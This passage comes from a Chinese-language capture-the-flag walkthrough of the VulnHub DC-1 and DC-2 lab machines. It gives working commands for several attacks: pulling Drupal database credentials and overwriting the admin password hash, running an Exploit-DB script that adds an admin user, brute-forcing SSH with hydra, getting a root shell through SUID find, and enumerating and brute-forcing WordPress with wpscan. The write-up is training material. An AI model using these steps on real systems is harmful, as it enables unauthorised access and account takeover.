<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cat</span> flag1.txt查看</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830142915555.png" alt="image-20220830142915555"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Every</span> good CMS needs a config <span class="keyword">file</span> - and so <span class="keyword">do</span> you.</span><br><span class="line">意思是：一个好的CMS（内容管理系统）需要一个config <span class="keyword">file</span>（配置文件）</span><br><span class="line"></span><br><span class="line">也就是我们需要看看它的配置文件，这是Flag2的线索</span><br></pre></td></tr></table></figure></div>

<h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><p>在目录下我们发现有个<code>sites</code>目录，也就是站点目录，里面很有可能有配置文件</p>
<p><img src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cd</span> sites;<span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830143404972.png" alt="image-20220830143404972"></p>
<p>有个<code>default</code>（默认）目录，查看一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cd</span> default;<span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830143517235.png" alt="image-20220830143517235"></p>
<p>看到<code>setting.php</code>也就差不多是<code>config file</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AXAPTA"><figure class="iseeu highlight /axapta"><table><tr><td class="code"><pre><span class="line">输入cat <span class="keyword">setting</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830143752469.png" alt="image-20220830143752469"></p>
<p>得到Flag2</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NSIS"><figure class="iseeu highlight /nsis"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * flag2</span></span><br><span class="line"><span class="comment"> * Brute force and dictionary attacks aren&#x27;t the</span></span><br><span class="line"><span class="comment"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="comment"> * What can you do with these credentials?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">意思是：暴力和字典攻击不是获得访问权限的唯一方法（您将需要访问权限）。</span><br><span class="line">你能用这些证书做什么？</span><br><span class="line"></span><br><span class="line">就是说不要局限于爆破密码来登录<span class="literal">admin</span>用户，你拥有了数据库这些信息，你可以做什么</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><p>关键分析这里，这是靶机数据库的用户名和密码的信息，</p>
<p>有了这个我们就可以进入靶机的数据库，对里面的数据库进行修改或增添</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ZEPHIR"><figure class="iseeu highlight /zephir"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span> (</span><br><span class="line">     <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   ),</span><br></pre></td></tr></table></figure></div>

<h3 id="1）mysql数据库修改admin用户的密码（或者新建一个用户密码）"><a href="#1）mysql数据库修改admin用户的密码（或者新建一个用户密码）" class="headerlink" title="1）mysql数据库修改admin用户的密码（或者新建一个用户密码）"></a>1）mysql数据库修改admin用户的密码（或者新建一个用户密码）</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">输入mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br><span class="line">*注意这里-u和-<span class="selector-tag">p</span>后面没有空格，有空格会报错</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830151236620.png" alt="image-20220830151236620"></p>
<p>先看看数据库</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">输入show databases<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830151531028.png" alt="image-20220830151531028"></p>
<p>查看<code>drupaldb</code>库里的表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">输入use drupaldb<span class="comment">;</span></span><br><span class="line">然后输入show tables<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830151716900.png" alt="image-20220830151716900"></p>
<p>看到<code>users</code>表，这就是我们登录成功的关键，查看该表</p>
<p><img src="/2022/08/29/vulnhub/image-20220830151829478.png" alt="image-20220830151829478"></p>
<p>发现有两个用户，我们的目的是修改或者获得admin用户的密码，当然也可以再创建一个用户，但是都需要加密</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ISBL"><figure class="iseeu highlight /isbl"><table><tr><td class="code"><pre><span class="line">因为这里我们可以发现用户的密码是被加密了的，那加密文件肯定是在脚本目录里，也就是<span class="variable"><span class="class">scripts</span></span>目录里，利用加密脚本，把我们的密码加密，然后更新数据库里<span class="variable">admin</span>用户原本的密码</span><br></pre></td></tr></table></figure></div>

<p>我们来找找密码加密脚本在哪里</p>
<p><img src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<p>看到<code>scripts</code>目录</p>
<p>进入查看</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cd</span> scripts;<span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830152428416.png" alt="image-20220830152428416"></p>
<p>发现有一个<code>password-hash.sh</code>文件，密码就是通过它进行hash加密的</p>
<p>运行它，让它把我们的密码加密</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">输入./password-<span class="built_in">hash</span>.sh  <span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<hr>
<p>但是运行可能会出现如下错误，如果没有请忽略</p>
<p><img src="/2022/08/29/vulnhub/image-20220830152851541.png" alt="image-20220830152851541"></p>
<p>报错说</p>
<p><code>include_once(/var/www/scripts/includes/password.inc): failed to open stream: No such file or directory</code> </p>
<p>也就是找不到该文件，但是发现，includes目录确实也不在scripts目录下，于是用cp把<code>includes</code>目录放到<code>scripts</code>目录下即可</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入cp -r ..<span class="regexp">/includes ./</span></span><br></pre></td></tr></table></figure></div>

<hr>
<p>得到加密数据</p>
<p><img src="/2022/08/29/vulnhub/image-20220830153417077.png" alt="image-20220830153417077"></p>
<p>再次进入mysql数据库，修改 admin密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">update<span class="built_in"> users </span><span class="built_in">set</span> <span class="attribute">pass</span>=<span class="string">&quot;<span class="variable">$S</span><span class="variable">$D9wpmqJmKcXIUSGVEY2utFL8LBiwX18pbpLhBZifD9gXThGAwz4x</span>&quot;</span> where <span class="attribute">name</span>=<span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830161703412.png" alt="image-20220830161703412"></p>
<p>我们试试能不能登录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NSIS"><figure class="iseeu highlight /nsis"><table><tr><td class="code"><pre><span class="line">用户名：<span class="literal">admin</span></span><br><span class="line"></span><br><span class="line">密码：<span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<p>登录成功</p>
<p><img src="/2022/08/29/vulnhub/image-20220830161808584.png" alt="image-20220830161808584"></p>
<p>得到flag3</p>
<p><img src="/2022/08/29/vulnhub/image-20220830161837967.png" alt="image-20220830161837967"></p>
<h3 id="2）利用drupal脚本添加管理员用户"><a href="#2）利用drupal脚本添加管理员用户" class="headerlink" title="2）利用drupal脚本添加管理员用户"></a>2）利用drupal脚本添加管理员用户</h3><p>优点是更加方便，快捷，<strong>但是脚本不是万能的，只有自己明白原理才是真正掌握</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.exploit-db.com<span class="regexp">/exploits/</span><span class="number">34992</span></span><br></pre></td></tr></table></figure></div>

<p>该网站在kali里面浏览器书签自带的，这个脚本适用于drupal，直接下载下来用即可</p>
<p><img src="/2022/08/29/vulnhub/image-20220830145453216.png" alt="image-20220830145453216"></p>
<p>下载好后，运行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">pytho<span class="symbol">n2</span> <span class="number">34992.</span>py -t http:<span class="comment">//192.168.133.136 -u admin001 -p 123456</span></span><br><span class="line"></span><br><span class="line">-t就是目标网站，-u就是新建的用户名，-p就是用户名密码</span><br><span class="line">*注意这个脚本需要 pytho<span class="symbol">n2</span>运行，pytho<span class="symbol">n3</span>语法不符合</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830145642143.png" alt="image-20220830145642143"></p>
<p>然后按照输入的，直接登录就可以了，或者直接点击下面链接</p>
<p><img src="/2022/08/29/vulnhub/image-20220830153620620.png" alt="image-20220830153620620"></p>
<p>就可以拿到<code>Flag3</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220830154431807.png" alt="image-20220830154431807"></p>
<hr>
<h2 id="Flag4"><a href="#Flag4" class="headerlink" title="Flag4"></a>Flag4</h2><h3 id="1）个人方法"><a href="#1）个人方法" class="headerlink" title="1）个人方法"></a>1）个人方法</h3><p>分析一下flag3</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but yo<span class="string">u&#x27;ll need to -exec that command to work out how to get what&#x27;</span>s <span class="keyword">in</span> the shadow.</span><br><span class="line"></span><br><span class="line">意思是：Special PERMS特别的权限（应该是root权限），passwd应该是查看<span class="regexp">/etc/</span>passwd目录，FIND意思利用find命令，-exec就是需要用它执行命令， get what<span class="string">&#x27;s in the shadow意思是flag4在/etc/shadow里</span></span><br></pre></td></tr></table></figure></div>

<p>我们先看看etc目录</p>
<p><img src="/2022/08/29/vulnhub/image-20220830163045108.png" alt="image-20220830163045108"></p>
<p>发现了passwd文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cat</span> passwd</span><br></pre></td></tr></table></figure></div>

<p>查看一下内容</p>
<p>发现有flag4的线索</p>
<p><img src="/2022/08/29/vulnhub/image-20220830163220380.png" alt="image-20220830163220380"></p>
<p>flag4是在/home/flag4里面，我们到目录里看看</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入cd <span class="regexp">/home/</span>flag4</span><br></pre></td></tr></table></figure></div>

<p>发现有个flag4.txt，查看</p>
<p><img src="/2022/08/29/vulnhub/image-20220830163358828.png" alt="image-20220830163358828"></p>
<p>得到flag4</p>
<h3 id="2）官方方法"><a href="#2）官方方法" class="headerlink" title="2）官方方法"></a>2）官方方法</h3><p>用了hydra[九头蛇]工具，对我们在passwd里看到flag4用户进行爆破</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -p <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt.gz <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-l是指定用户或指定包含多个用户的文件，-p是指定密码或指定包含多个密码的文件，ssh就是</span><br><span class="line">用户所在的网站</span><br><span class="line"></span><br><span class="line">上面-p的文件是自己下载的密码包</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830211739164.png" alt="image-20220830211739164"></p>
<p>这里就看到flag4用户的密码被爆破出来，是orange</p>
<p>然后用ssh连接</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">输入ssh <span class="symbol">flag4@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.136</span></span><br><span class="line">然后yes</span><br><span class="line">然后输入密码：orange</span><br></pre></td></tr></table></figure></div>

<p>进入flag4用户页面，</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">输入cat fla<span class="name">g4.</span>txt</span><br><span class="line">得到fla<span class="name">g4</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830211817515.png" alt="image-20220830211817515"></p>
<hr>
<h2 id="Flag5"><a href="#Flag5" class="headerlink" title="Flag5"></a>Flag5</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="OXYGENE"><figure class="iseeu highlight /oxygene"><table><tr><td class="code"><pre><span class="line">分析一下flag5</span><br><span class="line">Can you use this same <span class="keyword">method</span> <span class="title function_">to</span> <span class="title function_">find</span> <span class="title function_">or</span> <span class="title function_">access</span> <span class="title function_">the</span> <span class="title function_">flag</span> <span class="title function_">in</span> <span class="title function_">root</span>?</span><br><span class="line"></span><br><span class="line"><span class="title function_">Probably</span>. <span class="title function_">But</span> <span class="title function_">perhaps</span> <span class="title function_">it</span>&#x27;<span class="title function_">s</span> <span class="title function_">not</span> <span class="title function_">that</span> <span class="title function_">easy</span>.  <span class="title function_">Or</span> <span class="title function_">maybe</span> <span class="title function_">it</span> <span class="title function_">is</span>?</span><br><span class="line"></span><br><span class="line">意思是：您可以使用相同的方法查找或访问根目录中的标志吗？</span><br><span class="line"></span><br><span class="line">可能但也许这并不容易。也许是这样？</span><br></pre></td></tr></table></figure></div>

<p>root应该就是需要提权了</p>
<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>linux提权操作可以看一下我的<code>WEB随笔</code>里<code>suid</code>提权，下面只记录流程</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span>，查看目录下suid权限所有可执行二进制文件</span><br></pre></td></tr></table></figure></div>

<p>发现<code>find</code>目录</p>
<p><img src="/2022/08/29/vulnhub/image-20220830162407934.png" alt="image-20220830162407934"></p>
<p>于是可以利用find获取root权限shell</p>
<p>主要是要让find命令成功执行，找一个存在的文件即可</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQF"><figure class="iseeu highlight /sqf"><table><tr><td class="code"><pre><span class="line">以在根目录为例</span><br><span class="line">输入<span class="built_in">find</span> / -<span class="built_in">name</span> initrd.img -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br></pre></td></tr></table></figure></div>

<p>提权成功</p>
<p><img src="/2022/08/29/vulnhub/image-20220830164525214.png" alt="image-20220830164525214"></p>
<p>我们在flag4里知道，最后的旗子在root目录里</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cd</span> /root;<span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure></div>

<p>发现<code>thefinalflag.txt</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220830164848589.png" alt="image-20220830164848589"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you<span class="comment">&#x27;ve enjoyed this and learned some new skills.</span></span><br><span class="line"></span><br><span class="line">You can <span class="keyword">let</span> <span class="keyword">me</span> know what you thought <span class="keyword">of</span> this little journey</span><br><span class="line"><span class="keyword">by</span> contacting <span class="keyword">me</span> via Twitter - @DCAU7</span><br><span class="line">意思是：</span><br><span class="line">做得好！！！！</span><br><span class="line"></span><br><span class="line">希望你喜欢这一点，并学习了一些新技能。</span><br><span class="line"></span><br><span class="line">你可以告诉我你对这次小旅行的看法</span><br><span class="line">通过Twitter联系我-@DCAU7 </span><br></pre></td></tr></table></figure></div>

<p><strong>5个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="二、DC-2-初级"><a href="#二、DC-2-初级" class="headerlink" title="二、DC-2[初级]"></a>二、DC-2[初级]</h1><p><strong>five flags</strong></p>
<p> 先用nmap扫描一些</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">输入nmap -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">133.138</span></span><br></pre></td></tr></table></figure></div>

<p>发现内容太少了</p>
<p><img src="/2022/08/29/vulnhub/image-20220831205238565.png" alt="image-20220831205238565"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">输入nmap -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">133.138</span> -<span class="selector-tag">A</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p>
<p>发现7744端口运行的ssh，22端口被换了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Ssh</span>是一个安全的远程登录协议,它的端口号默认是<span class="number">22</span>端口</span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line">SSH 为 Secure <span class="keyword">Shell </span>的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、<span class="keyword">Digital </span>UNIX、Irix，以及其他平台，都可运行SSH。</span><br></pre></td></tr></table></figure></div>

<p>我们试试访问我们的靶机ip：<code>192.168.133.138</code></p>
<hr>
<p>但是访问失败【如果没有问题，可以忽略】</p>
<p><img src="/2022/08/29/vulnhub/image-20220831210742250.png" alt="image-20220831210742250"></p>
<p>可以看到，访问IP的时候进行了一个跳转，跳转到了<code>http://dc-2</code>，且无法访问</p>
<p>我猜测是<code>hosts</code>文件没有修改，所以域名无法登录</p>
<p>需要在<code>hosts</code>其中添加域名：<code>http://dc-2</code>和其ip：<code>192.168.133.138</code>，<code>dns</code>才能正常转换</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入vi <span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831211542540.png" alt="image-20220831211542540"></p>
<p>向其中添加</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.138</span> dc-<span class="number">2</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831212553718.png" alt="image-20220831212553718"></p>
<p>刷新浏览器，再次访问<code>192.168.133.138</code>或<code>http://dc-2</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220831212746196.png" alt="image-20220831212746196"></p>
<p>成功连接</p>
<hr>
<h2 id="Flag1-1"><a href="#Flag1-1" class="headerlink" title="Flag1"></a>Flag1</h2><p>进入网页就看到flag了</p>
<p><img src="/2022/08/29/vulnhub/image-20220831212936534.png" alt="image-20220831212936534"></p>
<p>点击打开查看</p>
<p><img src="/2022/08/29/vulnhub/image-20220831213114724.png" alt="image-20220831213114724"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">	</span><br><span class="line"></span><br><span class="line">Flag <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t <span class="keyword">work</span>, so <span class="keyword">instead</span>, maybe you just need <span class="keyword">to</span> be cewl.</span><br><span class="line"></span><br><span class="line">More passwords <span class="keyword">is</span> <span class="keyword">always</span> better, but sometimes you just can’t win them <span class="keyword">all</span>.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Log</span> <span class="keyword">in</span> <span class="keyword">as</span> one <span class="keyword">to</span> see the next flag.</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> you can’t find it, <span class="keyword">log</span> <span class="keyword">in</span> <span class="keyword">as</span> another.</span><br><span class="line"></span><br><span class="line">意思是：</span><br><span class="line">你通常的密码表可能不起作用，因此，也许你只需要成为cewl。</span><br><span class="line"></span><br><span class="line">密码越多越好，但有时你无法赢得所有密码。</span><br><span class="line"></span><br><span class="line">作为一个登录以查看下一个标志。</span><br><span class="line"></span><br><span class="line">如果找不到，请作为另一个登录。</span><br><span class="line"><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">·Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。</span><br><span class="line"></span><br><span class="line">那我们就用cewl工具试一下</span><br><span class="line">*不会工具一般用-h就可以知道使用说明</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Flag2-1"><a href="#Flag2-1" class="headerlink" title="Flag2"></a>Flag2</h2><p>根据flag1，我们用<code>cewl</code>试试生成字典</p>
<h3 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入cewl http:<span class="regexp">//</span>dc-<span class="number">2</span>/ &gt;pass.txt</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831221031390.png" alt="image-20220831221031390"></p>
<p>目录下就会生成<code>pass.txt</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cat</span> pass.txt，查看内容</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831221151099.png" alt="image-20220831221151099"></p>
<p>发现是生成对应网站的密码字典</p>
<p>flag1整理信息好像差不多了，下面我们利用dc1提到的<code>wappalyzer</code>，查看一下网页的框架结构有没有什么线索</p>
<p><img src="/2022/08/29/vulnhub/image-20220831221945690.png" alt="image-20220831221945690"></p>
<p>发现网站的<code>CMS</code>是<code>WordPress</code>，还可以看到它的主题是<code>Twenty Seventeen</code></p>
<p>那wordpress，有没有什么漏洞可以供我们利用呢，下面就提及另一个工具</p>
<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><p><code>WPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写 能够扫描WordPress网站中的多种安全漏洞,其中包括主题漏洞、插件漏洞和WordPress本身的漏洞</code></p>
<p>于是我们就可以针对性对wordpress进行渗透看看，可不可以利用一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -e u</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831223359965.png" alt="image-20220831223359965"></p>
<p>然后往下看用户名</p>
<p><img src="/2022/08/29/vulnhub/image-20220831223432802.png" alt="image-20220831223432802"></p>
<p>发现有三个，然后可以复制下来，弄一个用户名的文本，和之前的<code>pass.txt</code>这个密码本一样</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line">输入vi un.txt,把admin <span class="keyword">jerry </span>tom复制进去</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831223714569.png" alt="image-20220831223714569"></p>
<p>然后就可以结合我们的密码文本和用户名文本，利用wpscan这个工具，进行爆破操作了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -P pass.txt -U un.txt</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831223950721.png" alt="image-20220831223950721"></p>
<p>稍微等一会</p>
<p><img src="/2022/08/29/vulnhub/image-20220831224205560.png" alt="image-20220831224205560"></p>
<p>admin用户密码没有找到，应该是最高权限的账号</p>
<p>但是jerry和tom用户的密码知道了</p>
<p>下面，我们就要开始找登录的页面了，一般是后台网站</p>
<p>我们可以用dirsearch工具进行扫描看看</p>
<p><img src="/2022/08/29/vulnhub/image-20220831224818079.png" alt="image-20220831224818079"></p>
<p>发现网站</p>
<p><img src="/2022/08/29/vulnhub/image-20220831224833915.png" alt="image-20220831224833915"></p>
<p>用我们之前获得的用户名和密码登录试试</p>
<p>以<code>jerry</code>为例，好像用<code>tom</code>会显示密码错误</p>
